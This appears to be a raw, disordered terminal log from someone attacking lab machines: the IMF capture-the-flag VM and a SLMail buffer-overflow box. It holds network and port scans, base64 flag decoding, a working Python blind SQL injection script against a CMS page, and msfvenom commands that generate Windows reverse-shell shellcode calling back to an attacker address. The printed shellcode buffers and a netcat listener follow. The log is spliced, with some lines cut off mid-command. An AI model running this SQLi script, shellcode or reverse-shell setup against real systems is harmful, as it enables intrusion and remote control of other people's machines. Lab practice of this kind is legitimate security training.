curl -s -X GET http://imf.local                                             
<!DOCTYPE html>
<html class="no-js">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>IMF - Homepage</title>
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <!-- Place favicon.ico and apple-touch-icon.png in the root directory -->
        
        <!-- Fonts -->




        <!-- CSS -->

        <link rel="stylesheet" href="css/bootstrap.min.css">
        <link rel="stylesheet" href="css/font-awesome.min.css">
        <link rel="stylesheet" href="css/main.css">
        <link rel="stylesheet" href="css/animate.css">
        <link rel="stylesheet" href="css/responsive.css">
        

        <!-- Js -->
        <script src="js/vendor/modernizr-2.6.2.min.js"></script>
        <script src="js/vendor/jquery-1.10.2.min.js"></script>
        <script src="js/bootstrap.min.js"></script>
        <script src="js/ZmxhZzJ7YVcxbVl.js"></script>
        <script src="js/XUnRhVzVwYzNS.js"></script>
        <script src="js/eVlYUnZjZz09fQ==.min.js"></script>
        <script>
         new WOW(
            ).init();
        </script>

    </head>
    <body>


    <header>
        <div class="container">
            <div class="row">
                <div class="col-md-3 col-xs-6 col-sm-3">
                    <a href="#" class="logo">
                        <img src="images/logo.png" alt="">
                    </a>
                </div>
                <div class="col-md-6 col-xs-6 col-sm-6">
                    <div class="menu">
                        <nav class="navbar navbar-default" role="navigation">
                            <div class="container-fluid">
                                <!-- Brand and toggle get grouped for better mobile display -->
                                <div class="navbar-header">
                                    <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                                    <span class="sr-only">Toggle navigation</span>
                                    <span class="icon-bar"></span>
                                    <span class="icon-bar"></span>
                                    <span class="icon-bar"></span>
                                    </button>
                                </div>

                                <!-- Collect the nav links, forms, and other content for toggling -->
                                <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
                                    <ul class="nav navbar-nav">
                                        <li><a href="#banner">Home</a></li>
                                        <li><a href="projects.php">Projects</a></li>
                                        <li><a href="contact.php">Contact Us</a></li>
                                    </ul>
                                  
                                </div><!-- /.navbar-collapse -->
                            </div><!-- /.container-fluid -->
                        </nav>
                    </div>
                </div>
            </div>
        </div>
    </header>

    


    <section id="banner" class="wow fadeInUp">
        <div class="container">
            <div class="row">

                <div class="col-md-4 col-sm-6">
                    <div class="block">
                        <img class="app-img img-responsive" src="images/roundlogo.png" alt="">
                    </div>
                    
                </div>
                <div class="col-md-6 col-md-offset-1 col-sm-6">
                    <div class="block">
                        <h1>
                            Impossible Mission Force
                        </h1>
                        <p>
                            An independent intelligence agency for the United States government specialising in espionage.
                        </p>

                    </div>
                </div>
            </div>
        </div>
    </section>



    <footer class="wow fadeInUp" data-wow-delay=".8s">
        <div class="container text-center">
            <div class="row">
                <div class="col-md-12">
                        <a class="footer-logo"href="#">
                            <img class="img-responsive" src="images/logo.png" alt="">
                        </a>
                    <p>Copyright © 2016 Impossible Mission Force. All rights reserved.</p>
                    
                </div>
            </div>
        </div>
    </footer>

</body>
</html>
                                                                                                                                       user@jakin:~/Documents/imf$ curl -s -X GET http://imf.local | grep js
<html class="no-js">
        <script src="js/vendor/modernizr-2.6.2.min.js"></script>
        <script src="js/vendor/jquery-1.10.2.min.js"></script>
        <script src="js/bootstrap.min.js"></script>
        <script src="js/ZmxhZzJ7YVcxbVl.js"></script>
        <script src="js/XUnRhVzVwYzNS.js"></script>
        <script src="js/eVlYUnZjZz09fQ==.min.js"></script>
                                                                                                                                       
user@jakin:~/Documents/imf$ curl -s -X GET http://imf.local | grep js | tail -n 3
        <script src="js/ZmxhZzJ7YVcxbVl.js"></script>
        <script src="js/XUnRhVzVwYzNS.js"></script>
        <script src="js/eVlYUnZjZz09fQ==.min.js"></script>
                                                                                                                                       
user@jakin:~/Documents/imf$ curl -s -X GET http://imf.local | grep js | tail -n 3 | grep -oP ".?*"
grep: quantifier does not follow a repeatable item
                                                                                                                                       
user@jakin:~/Documents/imf$ curl -s -X GET http://imf.local | grep js | tail -n 3 | grep -oP '".*?"'
"js/ZmxhZzJ7YVcxbVl.js"
"js/XUnRhVzVwYzNS.js"
"js/eVlYUnZjZz09fQ==.min.js"
                                                                                                                                       
user@jakin:~/Documents/imf$ curl -s -X GET http://imf.local | grep js | tail -n 3 | grep -oP '".*?"' | tr -d '"'
js/ZmxhZzJ7YVcxbVl.js
js/XUnRhVzVwYzNS.js
js/eVlYUnZjZz09fQ==.min.js
                                                                                                                                       
user@jakin:~/Documents/imf$ curl -s -X GET http://imf.local | grep js | tail -n 3 | grep -oP '".*?"' | tr -d '"' | sed 's/js\///'
ZmxhZzJ7YVcxbVl.js
XUnRhVzVwYzNS.js
eVlYUnZjZz09fQ==.min.js
                                                                                                                                       
user@jakin:~/Documents/imf$ curl -s -X GET http://imf.local | grep js | tail -n 3 | grep -oP '".*?"' | tr -d '"' | sed 's/js\///' | awk '{print $1}' FS="."
ZmxhZzJ7YVcxbVl
XUnRhVzVwYzNS
eVlYUnZjZz09fQ==
                                                                                                                                       
user@jakin:~/Documents/imf$ curl -s -X GET http://imf.local | grep js | tail -n 3 | grep -oP '".*?"' | tr -d '"' | sed 's/js\///' | awk '{print $1}' FS="." | xargsZmxhZzJ7YVcxbVl XUnRhVzVwYzNS eVlYUnZjZz09fQ==
                                                                                                                                       
user@jakin:~/Documents/imf$ curl -s -X GET http://imf.local | grep js | tail -n 3 | grep -oP '".*?"' | tr -d '"' | sed 's/js\///' | awk '{print $1}' FS="." | xargs | tr -d ' '
ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==
                                                                                                                                       
user@jakin:~/Documents/imf$ curl -s -X GET http://imf.local | grep js | tail -n 3 | grep -oP '".*?"' | tr -d '"' | sed 's/js\///' | awk '{print $1}' FS="." | xargs | tr -d ' ' | base64 -d
flag2{aW1mYWRtaW5pc3RyYXRvcg==}                                                                                                                                       
user@jakin:~/Documents/imf$ echo -n 'aW1mYWRtaW5pc3RyYXRvcg==' base64 -d
aW1mYWRtaW5pc3RyYXRvcg== base64 -d                                                                                                                                       
┌──(user㉿jakin)-[~/Documents/imf]
└─$ echo -n 'aW1mYWRtaW5pc3RyYXRvcg=='| base64 -d
imfadministrator                                                                                                                                       
┌──(user㉿jakin)-[~/Documents/imf]
└─$ grep -r "imfadministrator" /usr/share/seclists -n
                                                                                                                                       
┌──(user㉿jakin)-[~/Documents/imf]
└─$echo -n 'Y29udGludWVUT2Ntcw==' | base64 -d   
continueTOcms                                                                                                                                       
┌──(user㉿jakin)-[~/Documents/imf]
└─$ cat exploits/sqli.py           
#!/usr/bin/python3

import requests, signal, sys, time, string
from pwn import *

def def_handler(sig,frame):
    print("\n[!] Exiting...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Global variables
main_url = "http://imf.local/imfadministrator/cms.php?pagename="
#characters = string.printable
characters = string.ascii_lowercase

def makeSQLi():
    p1 = log.progress("Brute force")
    p1.status("Starting brute force process")

    time.sleep(2)

    p2 = log.progress("Extracted data")

    headers = {
        'Cookie' :  'PHPSESSID=546aibbngp354f20svq65uhop7'
    }
    extracted_info = ""

    for position in range(1,6):
        for character in characters:
            sqli_url = main_url + "home' or substring(database(),%d,1)='%s" % (position,character)

            p1.status(sqli_url)
            r = requests.get(sqli_url, headers=headers)


            if "Welcome to the IMF Administration." not in r.text:
                extracted_info += character
                p2.status(extracted_info)
                break
    
    p1.success("SQLi attack done")
    p2.success(extracted_info)


if __name__ == '__main__':
    makeSQLi()                                                                                                                                       bytearray.txt  exploit.py  newexploit.py  notesbuffer32bitswindows.md  otherBOF.py
                                                                                                                                       
user@jakin:~/Documents/bufferOver32bitsWindows7$ cat bytearray.txt                    
================================================================================
  Output generated by mona.py v2.0, rev 628 - Immunity Debugger
  Corelan Consulting bv - https://www.corelan.be
================================================================================
  OS : 7, release 6.1.7601
  Process being debugged : SLmail (pid 3268)
  Current mona arguments: bytearray -cpb '\x00'
================================================================================
  2023-08-08 08:43:10
================================================================================
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
                                                                                                                                       
user@jakin:~/Documents/bufferOver32bitsWindows7$ rm bytearray.txt   
                                                                                                                                       
user@jakin:~/Documents/bufferOver32bitsWindows7$ ls
exploit.py  newexploit.py  notesbuffer32bitswindows.md  otherBOF.py
                                                                                                                                       
user@jakin:~/Documents/bufferOver32bitsWindows7$ rm newexploit.py 
                                                                                                                                       
user@jakin:~/Documents/bufferOver32bitsWindows7$ cat notesbuffer32bitswindows.md 
:5e:7d:3e:a2	(Unknown)
192.168.0.103	38:87:d5:13:8d:3c	(Unknown)
192.168.0.108	00:0c:29:4b:f4:e3	(Unknown)
192.168.0.100	58:95:d8:06:e6:a5	(Unknown)
192.168.0.101	6c:f7:84:3b:91:a4	(Unknown)

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.851 seconds (138.30 hosts/sec). 5 responded
                                                                                                                                       
┌──(user㉿jakin)-[~]
└─$ nmap -p-  -sS -n -Pn -vvv 192.168.0.108                        
You requested a scan type which requires root privileges.
QUITTING!
                                                                                                                                       
user@jakin:~$ sudo nmap -p-  -sS -n -Pn -vvv 192.168.0.108
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-07 13:17 BST
Initiating ARP Ping Scan at 13:17
Scanning 192.168.0.108 [1 port]
Completed ARP Ping Scan at 13:17, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:17
Scanning 192.168.0.108 [65535 ports]
Discovered open port 25/tcp on 192.168.0.108
Discovered open port 135/tcp on 192.168.0.108
Discovered open port 445/tcp on 192.168.0.108
Discovered open port 110/tcp on 192.168.0.108
Discovered open port 139/tcp on 192.168.0.108
Discovered open port 49156/tcp on 192.168.0.108
Discovered open port 5357/tcp on 192.168.0.108
Discovered open port 49152/tcp on 192.168.0.108
Discovered open port 49160/tcp on 192.168.0.108
Discovered open port 49153/tcp on 192.168.0.108
Discovered open port 180/tcp on 192.168.0.108
Discovered open port 79/tcp on 192.168.0.108
Discovered open port 49154/tcp on 192.168.0.108
Discovered open port 49155/tcp on 192.168.0.108
Discovered open port 106/tcp on 192.168.0.108
Completed SYN Stealth Scan at 13:17, 27.73s elapsed (65535 total ports)
Nmap scan report for 192.168.0.108
Host is up, received arp-response (0.00053s latency).
Scanned at 2023-08-07 13:17:12 BST for 28s
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE      REASON
25/tcp    open  smtp         syn-ack ttl 128
79/tcp    open  finger       syn-ack ttl 128
106/tcp   open  pop3pw       syn-ack ttl 128
110/tcp   open  pop3         syn-ack ttl 128
135/tcp   open  msrpc        syn-ack ttl 128
139/tcp   open  netbios-ssn  syn-ack ttl 128
180/tcp   open  ris          syn-ack ttl 128
445/tcp   open  microsoft-ds syn-ack ttl 128
5357/tcp  open  wsdapi       syn-ack ttl 128
49152/tcp open  unknown      syn-ack ttl 128
49153/tcp open  unknown      syn-ack ttl 128
49154/tcp open  unknown      syn-ack ttl 128
49155/tcp open  unknown      syn-ack ttl 128
49156/tcp open  unknown      syn-ack ttl 128
49160/tcp open  unknown      syn-ack ttl 128
MAC Address: 00:0C:29:4B:F4:E3 (VMware)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.92 seconds
           Raw packets sent: 68884 (3.031MB) | Rcvd: 65538 (2.622MB)
                                                                                                                                       
user@jakin:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  testing  Videos
                                                                                                                                       
user@jakin:~$ cd Documents               
                                                                                                                                       
user@jakin:~/Documents$ ls
pluck  ubuntuBufferOverlow32bits
                                                                                                                                       
user@jakin:~/Documents$ mkdir bufferOver32bitsWindows7
                                                                                                                                       
user@jakin:~/Documents$ cd bufferOver32bitsWindows7 
                                                                                                                                       
user@jakin:~/Documents/bufferOver32bitsWinuser@jakin:~/Documents/bufferOver32bitsWindows7$an.
Initiating NSE at 13:41
Completed NSE at 13:41, 0.00s elapsed
Nmap scan report for 192.168.0.108
Host is up, received conn-refused (0.0040s latency).
Scanned at 2023-08-07 13:41:02 BST for 12s

PORT    STATE SERVICE REASON  VERSION
110/tcp open  pop3    syn-ack BVRP Software SLMAIL pop3d
Service Info: Host: WIN-4BENRTTHMQ5

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:41
Completed NSE at 13:41, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:41
Completed NSE at 13:41, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:41
Completed NSE at 13:41, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.20 seconds
                                                                                                                                       
user@jakin:~/Documents/bufferOver32bitsWindows7$1506 bytes
unsigned char buf[] = 
"\xdb\xcf\xd9\x74\x24\xf4\x58\x2b\xc9\xbe\xb0\xc6\x04\xd2"
"\xb1\x52\x31\x70\x17\x83\xc0\x04\x03\xc0\xd5\xe6\x27\xdc"
"\x32\x64\xc7\x1c\xc3\x09\x41\xf9\xf2\x09\x35\x8a\xa5\xb9"
"\x3d\xde\x49\x31\x13\xca\xda\x37\xbc\xfd\x6b\xfd\x9a\x30"
"\x6b\xae\xdf\x53\xef\xad\x33\xb3\xce\x7d\x46\xb2\x17\x63"
"\xab\xe6\xc0\xef\x1e\x16\x64\xa5\xa2\x9d\x36\x2b\xa3\x42"
"\x8e\x4a\x82\xd5\x84\x14\x04\xd4\x49\x2d\x0d\xce\x8e\x08"
"\xc7\x65\x64\xe6\xd6\xaf\xb4\x07\x74\x8e\x78\xfa\x84\xd7"
"\xbf\xe5\xf2\x21\xbc\x98\x04\xf6\xbe\x46\x80\xec\x19\x0c"
"\x32\xc8\x98\xc1\xa5\x9b\x97\xae\xa2\xc3\xbb\x31\x66\x78"
"\xc7\xba\x89\xae\x41\xf8\xad\x6a\x09\x5a\xcf\x2b\xf7\x0d"
"\xf0\x2b\x58\xf1\x54\x20\x75\xe6\xe4\x6b\x12\xcb\xc4\x93"
"\xe2\x43\x5e\xe0\xd0\xcc\xf4\x6e\x59\x84\xd2\x69\x9e\xbf"
"\xa3\xe5\x61\x40\xd4\x2c\xa6\x14\x84\x46\x0f\x15\x4f\x96"
"\xb0\xc0\xc0\xc6\x1e\xbb\xa0\xb6\xde\x6b\x49\xdc\xd0\x54"
"\x69\xdf\x3a\xfd\x00\x1a\xad\xc2\x7d\x24\x47\xab\x7f\x24"
"\x96\x90\x09\xc2\xf2\xf6\x5f\x5d\x6b\x6e\xfa\x15\x0a\x6f"
"\xd0\x50\x0c\xfb\xd7\xa5\xc3\x0c\x9d\xb5\xb4\xfc\xe8\xe7"
"\x13\x02\xc7\x8f\xf8\x91\x8c\x4f\x76\x8a\x1a\x18\xdf\x7c"
"\x53\xcc\xcd\x27\xcd\xf2\x0f\xb1\x36\xb6\xcb\x02\xb8\x37"
"\x99\x3f\x9e\x27\x67\xbf\x9a\x13\x37\x96\x74\xcd\xf1\x40"
"\x37\xa7\xab\x3f\x91\x2f\x2d\x0c\x22\x29\x32\x59\xd4\xd5"
"\x83\x34\xa1\xea\x2c\xd1\x25\x93\x50\x41\xc9\x4e\xd1\x61"
"\x28\x5a\x2c\x0a\xf5\x0f\x8d\x57\x06\xfa\xd2\x61\x85\x0e"
"\xab\x95\x95\x7b\xae\xd2\x11\x90\xc2\x4b\xf4\x96\x71\x6b"
"\xdd";
                                                                                                                                       
user@jakin:~/Documents/bufferOver32bitsWindows7$ msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.0.106 LPORT=443 -f c -e x86/shikata_ga_nai -b '\x00\x01\x02\x03\x0a\x0d' EXITFUNC=thread 
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Error: No Encoder Succeeded
                                                                                                                                       
user@jakin:~/Documents/bufferOver32bitsWindows7$ msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.0.106 LPORT=443 -f c -e x86/shikata_ga_nai -b '\x00\x01\x02\x03\x0a\x0d' EXITFUNC=thread
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Error: No Encoder Succeeded                                                                                                                                       
user@jakin:~/Documents/bufferOver32bitsWindows7$ msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.0.106 LPORT=443 -f c -e x86/shikata_ga_nai  EXITFUNC=thread          
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1506 bytes
unsigned char buf[] = 
"\xba\x88\x5b\x41\xe3\xdb\xda\xd9\x74\x24\xf4\x5d\x33\xc9"
"\xb1\x52\x83\xed\xfc\x31\x55\x0e\x03\xdd\x55\xa3\x16\x21"
"\x81\xa1\xd9\xd9\x52\xc6\x50\x3c\x63\xc6\x07\x35\xd4\xf6"
"\x4c\x1b\xd9\x7d\x00\x8f\x6a\xf3\x8d\xa0\xdb\xbe\xeb\x8f"
"\xdc\x93\xc8\x8e\x5e\xee\x1c\x70\x5e\x21\x51\x71\xa7\x5c"
"\x98\x23\x70\x2a\x0f\xd3\xf5\x66\x8c\x58\x45\x66\x94\xbd"
"\x1e\x89\xb5\x10\x14\xd0\x15\x93\xf9\x68\x1c\x8b\x1e\x54"
"\xd6\x20\xd4\x22\xe9\xe0\x24\xca\x46\xcd\x88\x39\x96\x0a"
"\x2e\xa2\xed\x62\x4c\x5f\xf6\xb1\x2e\xbb\x73\x21\x88\x48"
"\x23\x8d\x28\x9c\xb2\x46\x26\x69\xb0\x00\x2b\x6c\x15\x3b"
"\x57\xe5\x98\xeb\xd1\xbd\xbe\x2f\xb9\x66\xde\x76\x67\xc8"
"\xdf\x68\xc8\xb5\x45\xe3\xe5\xa2\xf7\xae\x61\x06\x3a\x50"
"\x72\x00\x4d\x23\x40\x8f\xe5\xab\xe8\x58\x20\x2c\x0e\x73"
"\x94\xa2\xf1\x7c\xe5\xeb\x35\x28\xb5\x83\x9c\x51\x5e\x53"
"\x20\x84\xf1\x03\x8e\x77\xb2\xf3\x6e\x28\x5a\x19\x61\x17"
"\x7a\x22\xab\x30\x11\xd9\x3c\xff\x4e\xe1\xd6\x97\x8c\xe1"
"\x27\xd3\x18\x07\x4d\x33\x4d\x90\xfa\xaa\xd4\x6a\x9a\x33"
"\xc3\x17\x9c\xb8\xe0\xe8\x53\x49\x8c\xfa\x04\xb9\xdb\xa0"
"\x83\xc6\xf1\xcc\x48\x54\x9e\x0c\x06\x45\x09\x5b\x4f\xbb"
"\x40\x09\x7d\xe2\xfa\x2f\x7c\x72\xc4\xeb\x5b\x47\xcb\xf2"
"\x2e\xf3\xef\xe4\xf6\xfc\xab\x50\xa7\xaa\x65\x0e\x01\x05"
"\xc4\xf8\xdb\xfa\x8e\x6c\x9d\x30\x11\xea\xa2\x1c\xe7\x12"
"\x12\xc9\xbe\x2d\x9b\x9d\x36\x56\xc1\x3d\xb8\x8d\x41\x5d"
"\x5b\x07\xbc\xf6\xc2\xc2\x7d\x9b\xf4\x39\x41\xa2\x76\xcb"
"\x3a\x51\x66\xbe\x3f\x1d\x20\x53\x32\x0e\xc5\x53\xe1\x2f"
"\xcc";
                                                                                                                                       
user@jakin:~/Documents/bufferOver32bitsWindows7$ msfvneo -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.0.106 LPORT=443 -f c -e x86/shikata_ga_nai --bad-chars '\x00\x01\x02\x03\x0a\x0d' EXITFUNC=thread 
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Error: No Encoder Succeeded
                                                                                                                                       
user@jakin:~/Documents/bufferOver32bitsWindows7$ 
                                                                                                                                       
user@jakin:~/Documents/bufferOver32bitsWindows7$ msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.0.106 LPORT=443 -f c  --bad-chars '\x00\x01\x02\x03\x0a\x0d' EXITFUNC=thread  
Found 12 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of c file: 1491 bytes
unsigned char buf[] = 
"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\xf0\xda\xaa\x34\x83\xee\xfc\xe2\xf4\x0c\x32\x28\x34"
"\xf0\xda\xca\xbd\x15\xeb\x6a\x50\x7b\x8a\x9a\xbf\xa2\xd6"
"\x21\x66\xe4\x51\xd8\x1c\xff\x6d\xe0\x12\xc1\x25\x06\x08"
"\x91\xa6\xa8\x18\xd0\x1b\x65\x39\xf1\x1d\x48\xc6\xa2\x8d"
"\x21\x66\xe0\x51\xe0\x08\x7b\x96\xbb\x4c\x13\x92\xab\xe5"
"\xa1\x51\xf3\x14\xf1\x09\x21\x7d\xe8\x39\x90\x7d\x7b\xee"
"\x21\x35\x26\xeb\x55\x98\x31\x15\xa7\x35\x37\xe2\x4a\x41"
"\x06\xd9\xd7\xcc\xcb\xa7\x8e\x41\x14\x82\x21\x6c\xd4\xdb"
"\x79\x52\x7b\xd6\xe1\xbf\xa8\xc6\xab\xe7\x7b\xde\x21\x35"
"\x20\x53\xee\x10\xd4\x81\xf1\x55\xa9\x80\xfb\xcb\x10\x85"
"\xf5\x6e\x7b\xc8\x41\xb9\xad\xb2\x99\x06\xf0\xda\xc2\x43"
"\x83\xe8\xf5\x60\x98\x96\xdd\x12\xf7\x25\x7f\x8c\x60\xdb"
"\xaa\x34\xd9\x1e\xfe\x64\x98\xf3\x2a\x5f\xf0\x25\x7f\x64"
"\xa0\x8a\xfa\x74\xa0\x9a\xfa\x5c\x1a\xd5\x75\xd4\x0f\x0f"
"\x3d\x5e\xf5\xb2\x6a\x9c\xf0\xb0\xc2\x36\xf0\xdb\x11\xbd"
"\x16\xb0\xba\x62\xa7\xb2\x33\x91\x84\xbb\x55\xe1\x75\x1a"
"\xde\x38\x0f\x94\xa2\x41\x1c\xb2\x5a\x81\x52\x8c\x55\xe1"
"\x98\xb9\xc7\x50\xf0\x53\x49\x63\xa7\x8d\x9b\xc2\x9a\xc8"
"\xf3\x62\x12\x27\xcc\xf3\xb4\xfe\x96\x35\xf1\x57\xee\x10"
"\xe0\x1c\xaa\x70\xa4\x8a\xfc\x62\xa6\x9c\xfc\x7a\xa6\x8c"
"\xf9\x62\x98\xa3\x66\x0b\x76\x25\x7f\xbd\x10\x94\xfc\x72"
"\x0f\xea\xc2\x3c\x77\xc7\xca\xcb\x25\x61\x4a\x29\xda\xd0"
"\xc2\x92\x65\x67\x37\xcb\x25\xe6\xac\x48\xfa\x5a\x51\xd4"
"\x85\xdf\x11\x73\xe3\xa8\xc5\x5e\xf0\x89\x55\xe1";                                                                                                                                       
user@jakin:~/Documents/bufferOver32bitsWindows7$ nc -lvnp 443                        
listening on [any] 443 ...
^C
                                                                                                                                       
user@jakin:~/Documents/bufferOver32bitsWindows7$                                                                                                                                       
user@jakin:~/Documents/bufferOver32bitsWindows7$ 
                                                                                                                                       
user@jakin:~/Documents/bufferOver32bitsWindows7$ cd ..                          
                                                                                                                                       
user@jakin:~/Documents$ ls
bufferOver32bitsWindows7  pluck  ubuntuBufferOverlow32bits
                                                                                                                                       
user@jakin:~/Documents$ rm -rf *        
zsh: sure you want to delete all 3 files in /home/user/Documents [yn]? y
                                                                                                                                       
user@jakin:~/Documents$ sudo arp-scan -I eth0 --localnet --ignoredups
[sudo] password for user: 
WARNING: Could not obtain IP address for interface eth0. Using 0.0.0.0 for
the source address, which may not be what you want.
Either configure eth0 with an IP address, or manually specify the address
with the --arpspa option.
Interface: eth0, type: EN10MB, MAC: 00:0c:29:3e:5b:f8, IPv4: (none)
ERROR: Could not obtain interface IP address and netmask
ERROR: pcap_lookupnet: eth0: no IPv4 address assigned
                                                                                                                                       
user@jakin:~/Documents$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:3e:5b:f8 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::20c:29ff:fe3e:5bf8/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:bb:4b:18:4f brd ff:ff:ff:ff:ff:ff
user@jakin:~/Documents$ ls
                                                                                                                                       
user@jakin:~/Documents$ mkdir imf                     
                                                                                                                                       
user@jakin:~/Documents$ cd imf   
                                                                                                                                       
user@jakin:~/Documents/imf$ ls
                                                                                                                                       
user@jakin:~/Documents/imf$ mkt      
                                                                                                                                       
user@jakin:~/Documents/imf$ ls
content  exploits  nmap  scripts
                                                                                                                                       
user@jakin:~/Documents/imf$ librewolf &> /dev/null & disown
[1] 548287
                                                                                                                                       
user@jakin:~/Documents/imf$ sudo arp-scan -I eth0 --localnet --ignoredups
[sudo] password for user: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:3e:5b:f8, IPv4: 192.168.0.106
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.0.1	14:2e:5e:7d:3e:a2	Sercomm Corporation.
192.168.0.103	38:87:d5:13:8d:3c	Intel Corporate
192.168.0.111	00:0c:29:31:a6:8b	VMware, Inc.
192.168.0.100	58:95:d8:06:e6:a5	Shenzhen DOOGEE Hengtong Technology CO.,LTD
192.168.0.101	6c:f7:84:3b:91:a4	Xiaomi Communications Co Ltd

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.006 seconds (127.62 hosts/sec). 5 responded
                                                                                                                                       
user@jakin:~/Documents/imf$ ping -c1 192.168.0.111     
PING 192.168.0.111 (192.168.0.111) 56(84) bytes of data.
^C
--- 192.168.0.111 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms

                                                                                                                                       
user@jakin:~/Documents/imf$ nmap -p- -sS -n -Pn -vvv 192.168.0.111 -oG allPorts
You requested a scan type which requires root privileges.
QUITTING!
                                                                                                                                       
user@jakin:~/Documents/imf$ sudo nmap -p- -sS -n -Pn -vvv 192.168.0.111 -oG allPorts
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 07:08 BST
Initiating ARP Ping Scan at 07:08
Scanning 192.168.0.111 [1 port]
Completed ARP Ping Scan at 07:08, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 07:08
Scanning 192.168.0.111 [65535 ports]
Discovered open port 80/tcp on 192.168.0.111
SYN Stealth Scan Timing: About 20.02% done; ETC: 07:10 (0:02:04 remaining)
SYN Stealth Scan Timing: About 48.28% done; ETC: 07:10 (0:01:05 remaining)
Completed SYN Stealth Scan at 07:09, 104.32s elapsed (65535 total ports)
Nmap scan report for 192.168.0.111
Host is up, received arp-response (0.00036s latency).
